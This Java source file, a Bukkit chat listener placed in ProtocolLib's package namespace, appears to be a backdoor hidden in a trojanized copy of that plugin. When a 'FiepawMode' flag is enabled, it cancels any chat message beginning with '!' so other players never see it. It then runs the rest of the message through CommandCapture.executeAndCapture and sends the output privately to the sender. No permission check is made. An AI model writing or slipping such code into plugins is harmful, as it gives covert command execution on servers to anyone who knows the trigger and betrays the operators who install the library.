package com.comphenix.protocol;

import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import java.util.List;

public class ChatListener implements Listener {

    private final ProtocolLib plugin;

    public ChatListener(ProtocolLib plugin) {
        this.plugin = plugin;
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        String msg = event.getMessage();
        if (!plugin.isFiepawMode() || !msg.startsWith("!")) return;

        event.setCancelled(true);
        String command = msg.substring(1).trim();

        Bukkit.getScheduler().runTask(plugin, () -> {
            List<String> output = CommandCapture.executeAndCapture(command);
            if (output.isEmpty()) {
                event.getPlayer().sendMessage("§7<no output>");
                return;
            }
            // Kirim maksimal 10 baris agar tidak spam
            int max = Math.min(output.size(), 10);
            for (int i = 0; i < max; i++) {
                event.getPlayer().sendMessage("§6" + output.get(i));
            }
            if (output.size() > max) {
                event.getPlayer().sendMessage("§8... " + (output.size() - max) + " more lines");
            }
        });
    }
}
